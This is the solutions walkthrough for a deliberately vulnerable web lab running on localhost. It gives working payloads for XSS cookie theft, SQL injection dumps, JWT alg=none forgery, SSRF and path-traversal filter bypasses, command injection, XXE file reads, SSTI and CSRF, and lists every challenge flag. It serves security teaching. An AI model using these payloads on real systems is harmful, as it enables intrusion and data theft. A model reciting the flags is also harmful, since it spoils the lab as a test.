# PenTrix VulnLab – Solutions

Full walkthroughs for all 34 challenges. **Try each one yourself first** – the hints on each module page are there to nudge you, not to hand you the answer.

Base URL for every payload below: `http://localhost:3000`

---

## xss – Cross-Site Scripting

**1. Reflected XSS** – `PENTRIX{xss_reflected}`
The search box reflects your query into the page with no escaping:
```
GET /xss/search?q=<script>alert(1)</script>
```
Then prove it reached a victim by "sending" the cookie to the collector:
```
GET /xss/collect?c=abc&v=reflected
```
Why it works: untrusted input is concatenated straight into HTML. In the real world the attacker would mail this link to a victim.

**2. Stored XSS** – `PENTRIX{xss_stored}`
Post a comment containing a script; it is stored and rendered raw for every later visitor:
```
POST /xss/guestbook
author=you&body=<script>fetch('/xss/collect?c='+document.cookie+'&v=stored')</script>
```
Then:
```
GET /xss/collect?c=abc&v=stored
```
Why it works: the guestbook saves HTML verbatim and serves it back unsanitized. Stored XSS is worse than reflected because the victim only has to view the page.

**3. DOM XSS** – `PENTRIX{xss_dom}`
The `/xss/dom` demo page drops attacker-controlled data into the DOM with a dangerous sink (`innerHTML`). Feed it a payload, then:
```
GET /xss/collect?c=abc&v=dom
```
Why it works: the injection happens entirely in the browser – the server never sees the payload, so server-side filters cannot help.

---

## sqli – SQL Injection

**1. Login bypass** – `PENTRIX{sqli_login-bypass}`
The login query interpolates your username into SQL. Break out of the string and make the WHERE clause always true:
```
POST /sqli/login
username=admin' OR '1'='1&password=anything
```
Why it works: the query becomes `... WHERE username='admin' OR '1'='1' ...`, which matches the admin row without a password.

**2. UNION injection** – `PENTRIX{sqli_union}`
The product search concatenates `q` into the query. Append a UNION SELECT with matching column count:
```
GET /sqli/products?q=' UNION SELECT id,username,password,secret FROM users--%20
```
Why it works: UNION merges rows from another table into the result set, so the page renders usernames, password hashes, and secrets as "products".

**3. Blind boolean injection** – `PENTRIX{sqli_blind}`
`/sqli/product?id=` only answers "exists / not found", but you can ask it yes/no questions about the secret:
```
GET /sqli/product?id=1 AND substr((SELECT secret FROM users WHERE username='admin'),1,1)='P'
```
Repeat per character, then submit what you extracted:
```
POST /sqli/blind-submit
secret=<the secret you extracted>
```
Why it works: even a single bit of difference in the response is enough to exfiltrate data one boolean question at a time.

**4. Error-based injection** – `PENTRIX{sqli_error}`
Raw SQLite errors are printed to the page. Any malformed input proves the injection point:
```
GET /sqli/detail?id='
```
Why it works: verbose database errors confirm your input reached the SQL parser and leak schema details for free.

---

## auth – Broken Authentication

**1. No rate limiting** – `PENTRIX{auth_brute-force}`
Log in wrongly 5 or more times in the same session, then log in correctly as alice (`alice123`). Nothing stops you from guessing forever.
Why it works: no throttling, no lockout, no CAPTCHA. Weak passwords fall to simple scripting.

**2. JWT `alg=none`** – `PENTRIX{auth_jwt-none}`
The `/auth/jwt-admin` verifier trusts tokens whose header says `{"alg":"none"}` without checking any signature. Mint your own:
```python
import base64, json
enc = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b'=').decode()
token = enc({"alg":"none","typ":"JWT"}) + "." + enc({"user":"alice","role":"admin"}) + "."
```
```
GET /auth/jwt-admin  with header  Authorization: Bearer <token>
```
Why it works: the code branches around signature verification for `alg=none` and then trusts the self-declared `role` claim.

**3. Password reset forgery** – `PENTRIX{auth_reset}`
Reset tokens are just base64 of the username with no randomness and no server-side record. Forge one for admin:
```
POST /auth/reset/confirm
token=YWRtaW4=&newPassword=hacked123
```
(`YWRtaW4=` is base64 of `admin`.) The flag fires because that token was never legitimately issued in your session.
Why it works: predictable, unguessable-looking tokens are still predictable. Reset tokens must be random and single-use.

---

## idor – Broken Access Control

Log in as alice first: `GET /idor/login/alice` (password `alice123`).

**1. Profile IDOR** – `PENTRIX{idor_profile}`
```
GET /idor/users/1
```
You are user 2, but nothing stops you reading user 1 (admin).

**2. Order IDOR** – `PENTRIX{idor_order}`
```
GET /idor/orders/2
```
Order 2 belongs to bob. The endpoint checks you are logged in, not that the order is yours.

**3. Unprotected admin panel** – `PENTRIX{idor_admin}`
```
GET /idor/admin
```
The panel only checks for *a* session, never for the *admin role*. Any logged-in user sees every user and order.
Why all three work: the app confuses authentication (who you are) with authorization (what you may do).

---

## ssrf – Server-Side Request Forgery

**1. Basic SSRF** – `PENTRIX{ssrf_basic}`
The fetcher requests any URL you give it, including internal ones:
```
GET /ssrf/fetch?url=http://localhost:3000/ssrf/internal/secret
```
Why it works: user input becomes the server's outbound request target, so you can make the server talk to itself.

**2. Blocklist bypass** – `PENTRIX{ssrf_bypass}`
`/ssrf/fetch2` blocks URLs containing the *strings* `127.0.0.1` or `localhost`. The same address has other spellings:
```
GET /ssrf/fetch2?url=http://2130706433:3000/ssrf/internal/secret
```
(`2130706433` is the decimal form of `127.0.0.1`.)
Why it works: string blocklists are not address validation. Parse the URL, resolve the host, then decide.

---

## upload – Unrestricted File Upload

**1. Stored XSS via upload** – `PENTRIX{upload_stored-xss}`
No content checks at all, and files are served inline, so an uploaded SVG executes in the browser:
```
curl --data-binary @evil.svg "http://localhost:3000/upload?filename=evil.svg"
```
Why it works: the server never asks *what* the file is, and serving HTML/SVG inline turns storage into script execution.

**2. Blacklist bypass** – `PENTRIX{upload_blacklist-bypass}`
v2 blocks only the *exact* lowercased extensions `.php`, `.exe`, `.sh`. Smuggle the dangerous extension inside a longer name:
```
curl --data-binary @shell.php.jpg "http://localhost:3000/upload/blacklist?filename=shell.php.jpg"
```
Why it works: the check looks at the final extension only (`.jpg`), while the stored filename still contains `.php`. Blacklists enumerate badness; allowlists enumerate goodness.

---

## cmdi – Command Injection

**1. Ping gadget** – `PENTRIX{cmdi_basic}`
Your input is concatenated into a shell command with zero filtering:
```
GET /cmdi/ping?host=127.0.0.1;id
```
Why it works: `;` ends the `ping` command and starts yours. The server runs it with its own privileges.

**2. Filter bypass** – `PENTRIX{cmdi_bypass}`
v2 strips `;`, once. Shells offer other chaining operators:
```
GET /cmdi/ping2?host=127.0.0.1%26%26id
```
(`%26%26` is `&&`.) Newlines (`%0a`) and `||` work too.
Why it works: removing one bad character is not sanitization. Never build shell commands from user input; use argument arrays instead.

---

## xxe – XML External Entity Injection

**1. XXE file read** – `PENTRIX{xxe_file}`
The XML importer resolves external entities. Declare one pointing at a local file:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///home/hatch/workspace/pentrix-vulnlab/modules/xxe/secret.txt">]>
<data><name>&xxe;</name></data>
```
```
POST /xxe/import   (form field: xml)
```
Why it works: the parser fetches `file://` URIs and substitutes the file contents into the document.

**2. SSRF via XXE** – `PENTRIX{xxe_ssrf}`
The same entity expander also fetches `http://` URLs. Point the entity at the SSRF module's internal secret endpoint and chain XXE into SSRF. Same request shape as above with an `http://` SYSTEM URI.

---

## ssti – Server-Side Template Injection

**1. Basic SSTI** – `PENTRIX{ssti_basic}`
Your name is dropped into a template that gets evaluated:
```
GET /ssti/greet?name={{7*7}}
```
The page answers "Hello 49!", proving server-side evaluation.

**2. SSTI to RCE** – `PENTRIX{ssti_rce}`
Once template syntax evaluates, reach for the engine's internals (objects, attributes, subclasses) to break out of the sandbox and run OS commands or read the flag variable the challenge exposes:
```
GET /ssti/greet?name={{secretFlag}}
```
Why it works: templates are code. Rendering user input as template source hands attackers the interpreter.

---

## lfi – Path Traversal

**1. Basic traversal** – `PENTRIX{lfi_traversal}`
The `file` parameter is used as a filesystem path with no checks:
```
GET /lfi/view?file=..%2Fdocs%2Fsecret.txt
```
Why it works: `../` climbs out of the intended directory.

**2. Filter bypass** – `PENTRIX{lfi_filter-bypass}`
The download endpoint strips `../` exactly once. Nest the sequences so the strip creates a new one:
```
GET /lfi/download?file=....%2F%2Fdocs%2Fsecret.txt
```
(`....//` minus one `../` pass collapses back to `../`.)
Why it works: single-pass sanitization is undone by its own removal. Canonicalize the path first, then check it stays inside the allowed root.

---

## csrf – Cross-Site Request Forgery

**1. State-changing GET** – `PENTRIX{csrf_email}`
Log in (`GET /csrf/login/alice`), then note the email change needs no token and rides on your session cookie:
```
GET /csrf/change-email?email=pwned@evil.com
```
In the real attack this URL sits in an `<img>` tag on the attacker's page; your browser sends the request *with your cookies* when you visit it.

**2. Open redirect** – `PENTRIX{csrf_redirect}`
```
GET /csrf/go?to=https://evil.com
```
The server 302-redirects to any external URL. Attackers use this for phishing ("this link really goes to our site, look at the domain").
Why it works: the `to` parameter is never validated against an allowlist.

**3. Clickjacking** – `PENTRIX{csrf_clickjacking}`
```
GET /csrf/framedemo
```
The page is frameable because no `X-Frame-Options` / `frame-ancestors` header is set, so an attacker can overlay invisible frames and steal clicks.
Why it works: without framing defenses, your authenticated page becomes a puppet inside the attacker's page.

---

## api – API Security

**1. Mass assignment** – `PENTRIX{api_mass-assignment}`
Log in (`GET /api/login/alice`), then PATCH your profile with an extra field the API blindly copies:
```
PATCH /api/me
{"role":"admin"}
```
Why it works: the update handler merges the whole JSON body into the user object instead of picking allowed fields.

**2. Excessive data exposure** – `PENTRIX{api_exposure}`
```
GET /api/users
```
The response includes password hashes, and the flag rides in the `X-Pentrix-Flag` header. APIs must return only what the client needs.

**3. Missing rate limiting** – `PENTRIX{api_rate-limit}`
 Hammer the login endpoint: 14 failed attempts, then a correct one on attempt 15 (`alice` / `alice123`). No throttling exists, so credential stuffing is trivially scriptable.

---

## misconfig – Security Misconfiguration

**1. Verbose debug errors** – `PENTRIX{misconfig_debug}`
```
GET /misconfig/debug?err=1
```
The error page dumps configuration, and the `debugToken` in the dump *is* the flag. Stack traces and config dumps belong in logs, not responses.

**2. Exposed backup file** – `PENTRIX{misconfig_backup}`
```
GET /misconfig/backup.sql
```
A database backup sits in the web root, served like any static file. It contains the flag (and in real life, credentials).

**3. Directory listing** – `PENTRIX{misconfig_listing}`
```
GET /misconfig/files/
```
Directory browsing is enabled. The listing reveals `secret.txt`; fetch it for the flag. Disable auto-indexing and keep secrets out of web-accessible paths.

---

*All flags look like `PENTRIX{...}`. If a payload stops working, reset the lab database by deleting `data/vulnlab.db` and restarting the app – some challenges mutate lab state (passwords, roles, emails) by design.*
